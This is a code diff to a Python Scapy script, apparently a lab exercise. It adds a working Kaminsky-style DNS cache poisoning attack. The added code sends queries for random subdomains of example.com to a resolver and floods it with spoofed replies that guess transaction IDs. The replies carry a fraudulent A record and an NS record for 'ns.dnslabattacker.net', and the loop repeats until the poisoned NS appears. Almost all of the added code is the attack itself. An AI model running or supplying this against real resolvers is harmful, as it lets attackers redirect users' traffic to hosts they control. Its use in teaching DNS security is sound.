@@ -24,6 +24,9 @@ dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
+dns_ip = "127.0.0.1"
+request_domain = "example.com"
+
 '''
 Generates random strings of length 10.
 '''
@@ -49,11 +52,55 @@ def exampleSendDNSQuery():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
     sendPacket(sock, dnsPacket, my_ip, my_port)
-    response = sock.recv(4096)
+    response = sock.recv(4096) # read at most 4096 bytes
     response = DNS(response)
     print "\n***** Packet Received from Remote Server *****"
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+
+def sendDNSQuery(sock, query):
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=query))
+    sendPacket(sock, dnsPacket, dns_ip, my_port)
+    return
+
+"""
+    Spoof NS reply with attacker's IP and hostname
+"""
+def sendFakeReplies(query):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    spoofReply = DNS(
+        qr=1,
+        opcode=0,
+        aa=1,
+        tc=0,
+        rd=1,
+        ra=0,
+        z=0,
+        qd=DNSQR(qname=query, qtype="A"),
+        # answer with fraudulent ip (exp. rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151')
+        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="128.100.8.48"),
+        # provide the fraudulent name server
+        ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net")
+    )
+    print('Sending fake responses ...')
+    for i in range(100):
+        spoofReply[DNS].id = getRandomTXID()
+        sendPacket(sock, spoofReply, dns_ip, my_port)
+    return
+
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    while True:
+        query = getRandomSubDomain() + '.' + request_domain
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sendDNSQuery(sock, query)
+        
+        sendFakeReplies(query)
+
+        print('Check for response from BIND')
+        response = sock.recv(4096)
+        response = DNS(response)
+        print(response.show())
+        if response[DNS].ns.rdata == 'ns.dnslabattacker.net':
+            print("Success")
+            break
